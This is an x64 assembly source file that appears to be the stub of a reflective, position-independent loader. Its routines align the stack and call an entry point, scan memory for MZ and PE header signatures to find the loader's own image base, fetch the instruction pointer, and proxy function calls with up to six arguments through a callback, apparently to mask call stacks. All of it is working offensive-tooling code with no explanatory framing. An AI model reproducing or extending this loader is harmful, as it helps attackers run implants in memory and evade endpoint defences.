extern Entry

global Start
global KaynCaller
global GetRIPCallback

section .text$A
	Start:
        push    rsi
        mov		rsi, rsp
        and		rsp, 0FFFFFFFFFFFFFFF0h

        sub		rsp, 020h
        call    Entry

        mov		rsp, rsi
        pop		rsi
    ret

section .text$F
    KaynCaller:
           push rbx
           push rcx
           call caller
       caller:
           pop rcx
       loop:
           xor rbx, rbx
           mov ebx, 0x5A4D
           inc rcx
           cmp bx,  [ rcx ]
           jne loop
           xor rax, rax
           mov ax,  [ rcx + 0x3C ]
           add rax, rcx
           xor rbx, rbx
           add bx,  0x4550
           cmp bx,  [ rax ]
           jne loop
           mov rax, rcx
           pop rcx
           pop rbx
       ret

    GetRIPCallback:
        call    retptrcallback

    retptrcallback:
        pop	rax
        ret

    WorkCallback:
        mov rbx, rdx                ; backing up the struct as we are going to stomp rdx
        mov rax, [rbx]              ; ptr to function
        mov r10, [rbx+8]            ; number of args
        cmp r10,0
        jle JUMPFUNC
        mov rcx, [rbx + 0x10]        ; first arg
        sub r10, 1
        cmp r10,0
        jle JUMPFUNC
        mov rdx, [rbx + 0x18]        ; second arg
        sub r10, 1
        cmp r10,0
        jle JUMPFUNC
        mov r8, [rbx + 0x20]        ; third arg
        sub r10, 1
        cmp r10,0
        jle JUMPFUNC
        mov r9, [rbx + 0x28]        ; fourth arg
        sub r10, 1
        cmp r10,0
        jle JUMPFUNC
        mov rsi, [rbx+0x30]         ; fifth arg
        mov [rsp+0x28], rsi
        sub r10,1
        cmp r10,0
        jle JUMPFUNC
        mov rsi, [rbx + 0x38]       ;sixth arg
        mov [rsp+0x30], rsi
JUMPFUNC:
        jmp rax